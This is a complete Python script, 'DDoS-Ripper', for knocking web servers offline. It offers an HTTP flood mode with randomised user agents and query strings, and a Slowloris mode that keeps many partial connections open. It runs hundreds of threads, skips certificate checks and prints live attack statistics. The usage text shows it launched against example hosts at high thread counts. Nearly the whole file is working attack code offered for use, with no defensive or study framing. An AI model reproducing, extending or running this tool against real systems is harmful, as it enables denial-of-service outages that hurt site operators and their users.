#!/usr/bin/env python3
"""
DDoS-Ripper - Distributable Denied-of-Service (DDOS) attack server
Cuts off targets or surrounding infrastructure in a flood of Internet traffic
"""

import socket
import random
import threading
import time
import sys
import ssl
from urllib.parse import urlparse
from collections import defaultdict


class DRipper:
    def __init__(self, target, threads=135):
        self.target = target
        self.threads = threads
        self.running = True
        self.stats = {
            'total': 0,
            'success': 0,
            'failed': 0,
            'errors': defaultdict(int)
        }
        self.lock = threading.Lock()
        
        # Parse target URL
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        parsed = urlparse(target)
        self.host = parsed.hostname or parsed.path.split('/')[0]
        self.port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        self.path = parsed.path or '/'
        self.scheme = parsed.scheme or 'http'
        self.is_https = self.scheme == 'https'
        
        # User agents pool
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0',
            'curl/7.68.0',
            'PostmanRuntime/7.28.0',
            'python-requests/2.28.0'
        ]
        
        # Load headers from file if exists
        self.headers = self.load_headers()
    
    def load_headers(self):
        """Load custom headers from headers.txt if available"""
        headers = {}
        try:
            with open('headers.txt', 'r') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        key, value = line.split(':', 1)
                        headers[key.strip()] = value.strip()
        except FileNotFoundError:
            pass
        return headers
    
    def get_random_user_agent(self):
        """Get random user agent"""
        return random.choice(self.user_agents)
    
    def get_random_path(self):
        """Get random path with query parameters"""
        paths = [
            self.path,
            self.path + '?id=' + str(random.randint(1, 10000)),
            self.path + '?page=' + str(random.randint(1, 1000)),
            self.path + '?search=' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 15))),
            self.path + '?q=' + ''.join(random.choices('0123456789abcdef', k=random.randint(10, 32))),
        ]
        return random.choice(paths)
    
    def build_http_request(self, path=None):
        """Build HTTP request"""
        if path is None:
            path = self.get_random_path()
        
        user_agent = self.get_random_user_agent()
        
        # Build headers
        headers = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'DNT': '1',
            'Pragma': 'no-cache'
        }
        
        # Merge with custom headers
        headers.update(self.headers)
        
        # Build request
        request = f"GET {path} HTTP/1.1\r\n"
        request += f"Host: {self.host}\r\n"
        
        for key, value in headers.items():
            request += f"{key}: {value}\r\n"
        
        request += "\r\n"
        return request.encode()
    
    def attack(self):
        """Main attack function - sends HTTP requests"""
        while self.running:
            try:
                # Create socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                
                # Connect
                sock.connect((self.host, self.port))
                
                # Wrap with SSL if HTTPS
                if self.is_https:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.host)
                
                # Send request
                request = self.build_http_request()
                sock.sendall(request)
                
                # Try to receive response (but don't wait too long)
                try:
                    sock.settimeout(1)
                    response = sock.recv(4096)
                except socket.timeout:
                    pass
                except:
                    pass
                
                sock.close()
                
                # Update stats
                with self.lock:
                    self.stats['total'] += 1
                    self.stats['success'] += 1
                
            except socket.timeout:
                with self.lock:
                    self.stats['total'] += 1
                    self.stats['failed'] += 1
                    self.stats['errors']['timeout'] += 1
            except ConnectionRefusedError:
                with self.lock:
                    self.stats['total'] += 1
                    self.stats['failed'] += 1
                    self.stats['errors']['connection_refused'] += 1
            except Exception as e:
                with self.lock:
                    self.stats['total'] += 1
                    self.stats['failed'] += 1
                    error_type = type(e).__name__
                    self.stats['errors'][error_type] += 1
    
    def slowloris_attack(self):
        """Slowloris attack - keeps connections open"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.host, self.port))
                
                if self.is_https:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.host)
                
                # Send partial request
                request = f"GET {self.path} HTTP/1.1\r\n"
                request += f"Host: {self.host}\r\n"
                request += f"User-Agent: {self.get_random_user_agent()}\r\n"
                request += f"Content-Length: {random.randint(1000, 10000)}\r\n"
                
                sock.sendall(request.encode())
                
                # Keep connection alive
                start_time = time.time()
                while self.running and (time.time() - start_time) < 300:  # 5 minutes max
                    try:
                        sock.sendall(b"X-a: b\r\n")
                        time.sleep(10)
                    except:
                        break
                
                sock.close()
                
                with self.lock:
                    self.stats['total'] += 1
                    self.stats['success'] += 1
                    
            except Exception as e:
                with self.lock:
                    self.stats['total'] += 1
                    self.stats['failed'] += 1
                    error_type = type(e).__name__
                    self.stats['errors'][error_type] += 1
    
    def stats_printer(self):
        """Print real-time statistics"""
        start_time = time.time()
        while self.running:
            time.sleep(1)
            duration = time.time() - start_time
            with self.lock:
                total = self.stats['total']
                success = self.stats['success']
                failed = self.stats['failed']
                rps = total / duration if duration > 0 else 0
                print(f"\r[ATTACK] Total: {total} | Success: {success} | Failed: {failed} | RPS: {rps:.1f}", end='', flush=True)
    
    def run(self, mode='flood'):
        """Run the attack"""
        print("\n" + "=" * 70)
        print("🔥 DDoS-Ripper - Distributable Denied-of-Service Attack")
        print("=" * 70)
        print(f"Target:         {self.host}:{self.port}")
        print(f"Path:           {self.path}")
        print(f"Scheme:         {self.scheme.upper()}")
        print(f"Threads:        {self.threads}")
        print(f"Mode:           {mode.upper()}")
        print("-" * 70)
        print("Starting attack... Press Ctrl+C to stop")
        print("-" * 70)
        
        # Start stats printer
        stats_thread = threading.Thread(target=self.stats_printer, daemon=True)
        stats_thread.start()
        
        # Start attack threads
        threads = []
        attack_func = self.slowloris_attack if mode == 'slowloris' else self.attack
        
        for i in range(self.threads):
            thread = threading.Thread(target=attack_func, daemon=True)
            thread.start()
            threads.append(thread)
        
        try:
            # Keep main thread alive
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\n⚠️  Attack stopped by user")
            self.running = False
            time.sleep(1)
            self.print_stats()
    
    def print_stats(self):
        """Print final statistics"""
        duration = time.time() - (getattr(self, 'start_time', time.time()))
        total = self.stats['total']
        success = self.stats['success']
        failed = self.stats['failed']
        
        print("\n" + "=" * 70)
        print("📊 ATTACK STATISTICS")
        print("=" * 70)
        print(f"Total Requests:  {total:,}")
        print(f"Successful:      {success:,} ({success/total*100:.1f}%)" if total > 0 else "Successful:      0")
        print(f"Failed:          {failed:,} ({failed/total*100:.1f}%)" if total > 0 else "Failed:          0")
        
        if self.stats['errors']:
            print("\nErrors:")
            for error_type, count in self.stats['errors'].items():
                print(f"  {error_type}: {count:,}")
        
        print("=" * 70 + "\n")


def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description='DDoS-Ripper - Distributable Denied-of-Service (DDOS) attack server',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic attack
  python3 DRipper.py -s 192.168.1.1 -t 135
  
  # Attack with URL
  python3 DRipper.py -s https://example.com -t 200
  
  # Slowloris attack
  python3 DRipper.py -s example.com -t 500 --mode slowloris
  
  # High-intensity attack
  python3 DRipper.py -s 192.168.1.1:8080 -t 1000
        """
    )
    
    parser.add_argument('-s', '--server', required=True,
                       help='Target server (IP address, hostname, or URL)')
    parser.add_argument('-t', '--threads', type=int, default=135,
                       help='Number of threads (default: 135)')
    parser.add_argument('--mode', default='flood',
                       choices=['flood', 'slowloris'],
                       help='Attack mode: flood (default) or slowloris')
    
    args = parser.parse_args()
    
    # Create and run DRipper
    ripper = DRipper(target=args.server, threads=args.threads)
    
    try:
        ripper.start_time = time.time()
        ripper.run(mode=args.mode)
    except Exception as e:
        print(f"\n❌ Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()


